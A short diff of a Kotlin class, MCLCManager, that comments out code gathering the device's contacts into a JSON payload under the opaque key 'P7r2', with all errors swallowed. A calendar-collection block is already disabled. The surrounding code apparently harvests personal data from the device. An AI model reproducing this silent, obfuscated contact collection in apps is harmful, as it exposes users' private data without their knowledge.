@@ -82,12 +82,12 @@ class MCLCManager {
             } catch (e: OutOfMemoryError) {
             }
 
-            try {
-                // 联系人
-                jsonObject.addProperty("P7r2", GsonUtil.toJson(ContactsHelper.getContacts(ctx)))
-            } catch (e: Exception) {
-            } catch (e: OutOfMemoryError) {
-            }
+//            try {
+//                // 联系人
+//                jsonObject.addProperty("P7r2", GsonUtil.toJson(ContactsHelper.getContacts(ctx)))
+//            } catch (e: Exception) {
+//            } catch (e: OutOfMemoryError) {
+//            }
 
 //            try {
 //                jsonObject.add("calendar", CalendarHelper.getCalendarEvent(ctx))
